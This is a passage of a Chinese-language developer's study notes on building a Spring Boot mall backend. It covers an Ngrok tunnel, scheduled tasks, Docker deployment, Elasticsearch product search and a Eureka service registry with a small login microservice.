orderInfo.put(<span class="hljs-string">&quot;payUrl&quot;</span>,resp.get(<span class="hljs-string">&quot;code_url&quot;</span>));</code></pre></li>
</ul>
<h2 id="5-Ngrok实现内网穿透"><a href="#5-Ngrok实现内网穿透" class="headerlink" title="5 Ngrok实现内网穿透"></a>5 Ngrok实现内网穿透</h2><ul>
<li><p>注册Ngrok后进行实名认证</p>
</li>
<li><p>开通隧道</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715164520718.png" alt="image-20220715164520718"></p>
</li>
<li><p>获取隧道ID</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715164621244.png" alt="image-20220715164621244"></p>
</li>
<li><p>下载ngork客户端</p>
</li>
<li><p>启动客户端，输入对应的隧道ID，即可实现内网穿透</p>
</li>
</ul>
<h2 id="6-quartz定时任务框架使⽤"><a href="#6-quartz定时任务框架使⽤" class="headerlink" title="6 quartz定时任务框架使⽤"></a>6 quartz定时任务框架使⽤</h2><h3 id="6-1-导入依赖"><a href="#6-1-导入依赖" class="headerlink" title="6.1 导入依赖"></a>6.1 导入依赖</h3><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>

<h3 id="6-2-创建定时任务"><a href="#6-2-创建定时任务" class="headerlink" title="6.2 创建定时任务"></a>6.2 创建定时任务</h3><pre><code class="hljs java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrintHelloWorldJob</span> &#123;
 <span class="hljs-comment">//https://cron.qqe2.com</span>
 <span class="hljs-meta">@Scheduled(cron = &quot;0/3 * * * * ?&quot;)</span>
 <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printHelloWorld</span><span class="hljs-params">()</span>&#123;
 System.out.println(<span class="hljs-string">&quot;----hello world.&quot;</span>);
 &#125;
&#125;</code></pre>

<h3 id="6-3-在启动类添加注解以开启定时任务"><a href="#6-3-在启动类添加注解以开启定时任务" class="headerlink" title="6.3 在启动类添加注解以开启定时任务"></a>6.3 在启动类添加注解以开启定时任务</h3><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableScheduling</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuartzDemoApplication</span> &#123;
 <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
 SpringApplication.run(QuartzDemoApplication.class, args);
 &#125;
&#125;</code></pre>



<p>当控制台打印出这段日志时，说明定时任务创建成功</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716085923884.png" alt="image-20220716085923884"></p>
<h2 id="7-后端项目部署"><a href="#7-后端项目部署" class="headerlink" title="7 后端项目部署"></a>7 后端项目部署</h2><p>使用docker部署项目</p>
<ul>
<li><p>Dockerfile</p>
<pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> java:<span class="hljs-number">8</span>-alpine
<span class="hljs-keyword">COPY</span><span class="language-bash"> ./app.jar /tmp/app.jar</span>
<span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span>
<span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> java -jar /tmp/app.jar</span></code></pre>
</li>
<li><p>项目打包</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719123949027.png" alt="image-20220719123949027"></p>
</li>
<li><p>将jar包放到与dockerfile同一目录下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124037998.png" alt="image-20220719124037998"></p>
</li>
<li><p>上传到服务器中构建镜像</p>
<p>进入到Dockerfile所在的目录下，运行以下命令</p>
<pre><code class="hljs sh">docker build -t fmmall .</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124317986.png" alt="image-20220719124317986"></p>
</li>
<li><p>创建容器</p>
<pre><code class="hljs sh">docker run --name fmmall -p 8080:8080 -d  fmmall</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124407926.png" alt="image-20220719124407926"></p>
</li>
</ul>
<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><h3 id="使用watch-dog机制监视redis中key的过期时间"><a href="#使用watch-dog机制监视redis中key的过期时间" class="headerlink" title="使用watch dog机制监视redis中key的过期时间"></a>使用watch dog机制监视redis中key的过期时间</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220726222800912.png" alt="image-20220726222800912"></p>
<blockquote>
<p>看门狗线程：用于给当前的key延长过期时间，保证业务线程正常执行过程，锁不会过期</p>
</blockquote>
<h3 id="分布式锁框架-redisson"><a href="#分布式锁框架-redisson" class="headerlink" title="分布式锁框架-redisson"></a>分布式锁框架-redisson</h3><blockquote>
<p>基于redis+看门狗实现的分布式锁框架</p>
</blockquote>
<h3 id="ES"><a href="#ES" class="headerlink" title="ES"></a>ES</h3><h4 id="springboot整合ES"><a href="#springboot整合ES" class="headerlink" title="springboot整合ES"></a>springboot整合ES</h4><ul>
<li><p>导入依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>配置信息</p>
<pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">elasticsearch:</span>
    <span class="hljs-attr">rest:</span>
      <span class="hljs-attr">uris:</span> <span class="hljs-string">http://192.168.238.132:9200</span></code></pre>
</li>
<li><p>将数据库中的信息导入到ES中</p>
<blockquote>
<p>如果商品表中没有数据，则在平台管理系统中的商品添加功能中，当商家向商品表添加并上架一个商品时同步向ES添加一个商品;商家下架一个商品就从ES中删除一个商品。<br>系统运行前期数据量小没有使用ES，当数据量增长之后使用ES时，需要将数据库现有的数据导入到ES(导入工作需要在项目部署到生产环境之前来完成)</p>
</blockquote>
<pre><code class="hljs java"><span class="hljs-comment">// 1.查询数据库获取到所有数据</span>
        List&lt;ProductVO&gt; productVOS = productMapper.selectProducts();
        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> productVOS.size();

<span class="hljs-comment">//        return ResultVO.success(size);</span>
        <span class="hljs-comment">// 2. 遍历数据将数据写入到ES中</span>
        <span class="hljs-built_in">this</span>.client =<span class="hljs-keyword">new</span> <span class="hljs-title class_">RestHighLevelClient</span>(RestClient.builder(
                HttpHost.create(<span class="hljs-string">&quot;http://192.168.238.132:9200&quot;</span>)
        ));
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; productVOS.size(); i++) &#123;
            <span class="hljs-type">ProductVO</span> <span class="hljs-variable">productVO</span> <span class="hljs-operator">=</span> productVOS.get(i);
            <span class="hljs-type">String</span> <span class="hljs-variable">productId</span> <span class="hljs-operator">=</span> productVO.getProductId();
            <span class="hljs-type">String</span> <span class="hljs-variable">productName</span> <span class="hljs-operator">=</span> productVO.getProductName();
            <span class="hljs-type">Integer</span> <span class="hljs-variable">soldNum</span> <span class="hljs-operator">=</span> productVO.getSoldNum();

            List&lt;ProductSku&gt; skus = productVO.getSkus();
            <span class="hljs-type">String</span> <span class="hljs-variable">skuImg</span> <span class="hljs-operator">=</span> skus.size() == <span class="hljs-number">0</span>? <span class="hljs-string">&quot;&quot;</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSkuImg();
            <span class="hljs-type">String</span> <span class="hljs-variable">skuName</span> <span class="hljs-operator">=</span> skus.size() == <span class="hljs-number">0</span>? <span class="hljs-string">&quot;&quot;</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSkuName();
            <span class="hljs-type">Integer</span> <span class="hljs-variable">sellPrice</span> <span class="hljs-operator">=</span> skus.size() == <span class="hljs-number">0</span>? <span class="hljs-number">0</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSellPrice();

            <span class="hljs-type">Product4ES</span> <span class="hljs-variable">product4ES</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product4ES</span>(productId, productName, skuImg, soldNum, skuName, sellPrice);

            <span class="hljs-type">IndexRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexRequest</span>(<span class="hljs-string">&quot;fmmallproductindex&quot;</span>);
            request.id(productId).source(JSON.toJSONString(product4ES), XContentType.JSON);
            <span class="hljs-type">IndexResponse</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.client.index(request, RequestOptions.DEFAULT);
            System.out.println(<span class="hljs-string">&quot;------ i &quot;</span> + i + <span class="hljs-string">&quot;-----&quot;</span> + index);
        &#125;

        <span class="hljs-built_in">this</span>.client.close();</code></pre>


</li>
<li><p>使用ES进行进行全文搜索</p>
<pre><code class="hljs java"><span class="hljs-comment">/*从ES中查询信息*/</span>
<span class="hljs-built_in">this</span>.client =<span class="hljs-keyword">new</span> <span class="hljs-title class_">RestHighLevelClient</span>(RestClient.builder(
    HttpHost.create(<span class="hljs-string">&quot;http://192.168.238.132:9200&quot;</span>)
));

<span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> (pageNum-<span class="hljs-number">1</span>)*limit;
<span class="hljs-type">SearchRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequest</span>(<span class="hljs-string">&quot;fmmallproductindex&quot;</span>);

<span class="hljs-type">SearchSourceBuilder</span> <span class="hljs-variable">sourceBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchSourceBuilder</span>();
sourceBuilder.query(QueryBuilders.multiMatchQuery(kw, <span class="hljs-string">&quot;productName&quot;</span>, <span class="hljs-string">&quot;pruductSkuName&quot;</span>));
<span class="hljs-comment">// 分页条件</span>
sourceBuilder.from(start);
sourceBuilder.size(limit);
<span class="hljs-comment">// 高亮显示</span>
<span class="hljs-type">HighlightBuilder</span> <span class="hljs-variable">highlightBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighlightBuilder</span>();
HighlightBuilder.<span class="hljs-type">Field</span> <span class="hljs-variable">productName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighlightBuilder</span>.Field(<span class="hljs-string">&quot;productName&quot;</span>);
HighlightBuilder.<span class="hljs-type">Field</span> <span class="hljs-variable">pruductSkuName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighlightBuilder</span>.Field(<span class="hljs-string">&quot;pruductSkuName&quot;</span>);
highlightBuilder.field(productName);
highlightBuilder.field(pruductSkuName);
highlightBuilder.preTags(<span class="hljs-string">&quot;&lt;label style=&#x27;color:red&#x27;&gt;&quot;</span>);
highlightBuilder.postTags(<span class="hljs-string">&quot;&lt;label&gt;&quot;</span>);
sourceBuilder.highlighter(highlightBuilder);
request.source(sourceBuilder);
<span class="hljs-type">SearchResponse</span> <span class="hljs-variable">searchResponse</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
<span class="hljs-keyword">try</span> &#123;
    searchResponse = <span class="hljs-built_in">this</span>.client.search(request, RequestOptions.DEFAULT);
&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
    e.printStackTrace();
&#125;
<span class="hljs-comment">// 处理响应结果</span>
<span class="hljs-type">SearchHits</span> <span class="hljs-variable">hits</span> <span class="hljs-operator">=</span> searchResponse.getHits();
<span class="hljs-type">TotalHits</span> <span class="hljs-variable">totalHits</span> <span class="hljs-operator">=</span> hits.getTotalHits();

<span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) totalHits.value;   <span class="hljs-comment">// 查询到的记录总数</span>
<span class="hljs-type">int</span> <span class="hljs-variable">pageCount</span> <span class="hljs-operator">=</span> (count%limit==<span class="hljs-number">0</span>? count/limit:count/limit+<span class="hljs-number">1</span>);

Iterator&lt;SearchHit&gt; iterator = hits.iterator();
List&lt;Product4ES&gt; product4ESList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">while</span>(iterator.hasNext())&#123;
    <span class="hljs-type">SearchHit</span> <span class="hljs-variable">nextHit</span> <span class="hljs-operator">=</span> iterator.next();
    <span class="hljs-type">String</span> <span class="hljs-variable">sourceAsString</span> <span class="hljs-operator">=</span> nextHit.getSourceAsString();
    <span class="hljs-type">Product4ES</span> <span class="hljs-variable">product4ES</span> <span class="hljs-operator">=</span> JSON.parseObject(sourceAsString, Product4ES.class);

    <span class="hljs-comment">// 获取高亮字段</span>
    Map&lt;String, HighlightField&gt; highlightFields = nextHit.getHighlightFields();
    <span class="hljs-type">HighlightField</span> <span class="hljs-variable">highLightProductName</span> <span class="hljs-operator">=</span> highlightFields.get(<span class="hljs-string">&quot;productName&quot;</span>);
    <span class="hljs-keyword">if</span>(highLightProductName != <span class="hljs-literal">null</span>)&#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> Arrays.toString(highLightProductName.fragments());
        product4ES.setProductName(string);
    &#125;
    product4ESList.add(product4ES);
&#125;


PageHelper&lt;Product4ES&gt; pageHelper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageHelper</span>&lt;&gt;(count, pageCount, product4ESList);
<span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;SUCCESS&quot;</span>, pageHelper);
<span class="hljs-keyword">return</span> resultVO;
</code></pre></li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730122320909.png" alt="image-20220730122320909"></p>
<h3 id="搭建服务发现和注册中心Eureka"><a href="#搭建服务发现和注册中心Eureka" class="headerlink" title="搭建服务发现和注册中心Eureka"></a>搭建服务发现和注册中心Eureka</h3><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730180822713.png" alt="image-20220730180822713" style="zoom:67%;">

<ul>
<li><p>添加关于erueka相关配置信息</p>
<pre><code class="hljs properties"><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">service-url</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">defaultZone</span>: <span class="hljs-string">http://127.0.0.1:8761/eureka</span>
    <span class="hljs-attr">register-with-eureka</span>: <span class="hljs-string">false</span>
    <span class="hljs-attr">fetch-registry</span>: <span class="hljs-string">false</span>

<span class="hljs-attr">server</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">port</span>: <span class="hljs-string">8761</span>
<span class="hljs-attr">spring</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">eureka-server</span>
</code></pre>
</li>
<li><p>在项目的启动类中添加注释<code>@EnableEurekaServer</code></p>
<pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> com.qfedu.eureka.server;

<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableEurekaServer</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EurekaServerApplication</span> &#123;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        SpringApplication.run(EurekaServerApplication.class, args);
    &#125;

&#125;</code></pre>
</li>
<li><p>配置security信息</p>
<pre><code class="hljs properties"><span class="hljs-attr">spring</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">eureka-server</span>

  <span class="hljs-attr">security</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">user</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">name</span>: <span class="hljs-string">sunzy</span>
      <span class="hljs-attr">password</span>: <span class="hljs-string">111111</span></code></pre>
</li>
<li><p>配置springsecuity</p>
<pre><code class="hljs java">  ```



### 拆分用户登录模块

- 首先创建新的模块 api-user-login

- 导入依赖

  ```xml
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
  &lt;/dependency&gt;
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;
  &lt;/dependency&gt;
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
      &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;
  &lt;/dependency&gt;
  
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
      &lt;scope&gt;test&lt;/scope&gt;
  &lt;/dependency&gt;</code></pre>


</li>
<li><p>配置application.yml</p>
<pre><code class="hljs properties"><span class="hljs-attr">server</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">port</span>: <span class="hljs-string">8001</span>

<span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">service-url</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">defualtZone</span>: <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span>
<span class="hljs-attr">spring</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">api-user-login</span>
</code></pre>
</li>
<li><p>在启动类添加注解<code>@EnableDiscoveryClient</code>和<code>@EnableFeignClients</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.api;

<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;
<span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableDiscoveryClient</span>
<span class="hljs-meta">@EnableFeignClients</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiUserLoginApplication</span> &#123;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        SpringApplication.run(ApiUserLoginApplication.class, args);
    &#125;

&#125;</code></pre>

<p>添加注解后既可启动服务，在注册中心中可以看到注册成功的服务</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730224027994.png" alt="image-20220730224027994"></p>
</li>
</ul>
<h3 id="用户查询模块"><a href="#用户查询模块" class="headerlink" title="用户查询模块"></a>用户查询模块</h3><blockquote>
<p>该模块的主要的作用是为登录提供用户查询功能，因此涉及到服务调用</p>
</blockquote>
<ul>
<li><p>首先创建模块user-check</p>
</li>
<li><p>pom文件内容</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
<span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.qfedu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>user-check<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>user-check<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">spring-cloud.version</span>&gt;</span>2021.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">spring-cloud.version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.qfedu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>common<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
